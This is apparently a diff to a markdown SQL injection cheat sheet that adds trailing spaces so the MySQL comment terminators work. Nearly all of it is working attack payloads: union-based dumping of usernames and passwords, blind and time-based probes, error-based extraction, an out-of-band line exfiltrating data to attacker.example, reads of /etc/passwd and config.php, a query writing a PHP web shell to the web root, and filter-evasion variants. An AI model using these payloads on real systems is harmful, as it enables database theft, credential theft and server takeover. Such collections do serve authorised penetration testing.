@@ -9,62 +9,62 @@ A comprehensive collection of working payloads for web application security test
 ### MySQL - Basic Detection
 
 ```sql
-' OR 1=1--
+' OR 1=1-- 
 ' OR '1'='1
-' UNION SELECT 1,database(),3--
-' UNION SELECT 1,user(),3--
-admin'--
+' UNION SELECT 1,database(),3-- 
+' UNION SELECT 1,user(),3-- 
+admin'-- 
 ```
 
 ### MySQL - Union-Based Extraction
 
 ```sql
-' UNION SELECT 1,database(),version()--
-' UNION SELECT 1,user(),@@datadir--
-' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()--
-' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
-' UNION SELECT 1,CONCAT(username,0x3a,password),3 FROM users--
+' UNION SELECT 1,database(),version()-- 
+' UNION SELECT 1,user(),@@datadir-- 
+' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- 
+' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- 
+' UNION SELECT 1,CONCAT(username,0x3a,password),3 FROM users-- 
 ```
 
 ### MySQL - Blind Boolean
 
 ```sql
-' AND 1=1--
-' AND 1=2--
-' AND SUBSTRING((SELECT database()),1,1)='a'--
-' AND (SELECT COUNT(*) FROM users)>0--
+' AND 1=1-- 
+' AND 1=2-- 
+' AND SUBSTRING((SELECT database()),1,1)='a'-- 
+' AND (SELECT COUNT(*) FROM users)>0-- 
 ```
 
 ### MySQL - Time-Based Blind
 
 ```sql
-' AND SLEEP(5)--
-' AND BENCHMARK(5000000,MD5('test'))--
-' OR IF(1=1,SLEEP(5),0)--
-' UNION SELECT IF(SUBSTRING((SELECT database()),1,1)='a',SLEEP(5),0),NULL,NULL--
+' AND SLEEP(5)-- 
+' AND BENCHMARK(5000000,MD5('test'))-- 
+' OR IF(1=1,SLEEP(5),0)-- 
+' UNION SELECT IF(SUBSTRING((SELECT database()),1,1)='a',SLEEP(5),0),NULL,NULL-- 
 ```
 
 ### MySQL - Error-Based
 
 ```sql
-' AND extractvalue(1,CONCAT(0x7e,(SELECT database())))--
-' AND updatexml(1,CONCAT(0x7e,(SELECT user())),1)--
-' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND extractvalue(1,CONCAT(0x7e,(SELECT database())))-- 
+' AND updatexml(1,CONCAT(0x7e,(SELECT user())),1)-- 
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- 
 ```
 
 ### MySQL - Out-of-Band
 
 ```sql
-' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.example\\test'))--
-' UNION SELECT 1,2,3 INTO OUTFILE '/tmp/test.txt'--
+' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.example\\test'))-- 
+' UNION SELECT 1,2,3 INTO OUTFILE '/tmp/test.txt'-- 
 ```
 
 ### MySQL - File Read / Write
 
 ```sql
-' UNION SELECT LOAD_FILE('/etc/passwd')--
-' UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3--
-' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--
+' UNION SELECT LOAD_FILE('/etc/passwd')-- 
+' UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3-- 
+' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'-- 
 ```
 
 ### MSSQL - Basic
@@ -154,24 +154,24 @@ redis-cli -h target
 
 ```sql
 -- Case variation
-' UnIoN SeLeCt 1,database(),3--
+' UnIoN SeLeCt 1,database(),3-- 
 
 -- Inline comments (MySQL)
-' /*!UNION*/ /*!SELECT*/ 1,database(),3--
+' /*!UNION*/ /*!SELECT*/ 1,database(),3-- 
 
 -- Double-write
-' UNUNIONION SELSELECTECT 1,database(),3--
+' UNUNIONION SELSELECTECT 1,database(),3-- 
 
 -- Space alternatives
-'/**/UNION/**/SELECT/**/1,database(),3--
-'%0aUNION%0aSELECT%0a1,2,3--
-'(UNION(SELECT(1),(database()),(3)))--
+'/**/UNION/**/SELECT/**/1,database(),3-- 
+'%0aUNION%0aSELECT%0a1,2,3-- 
+'(UNION(SELECT(1),(database()),(3)))-- 
 
 -- Hex encoding
-' UNION SELECT 1,hex(database()),3--
+' UNION SELECT 1,hex(database()),3-- 
 
 -- Null byte injection
-' UN%00ION SELECT 1,2,3--
+' UN%00ION SELECT 1,2,3-- 
 ```
 
 ---
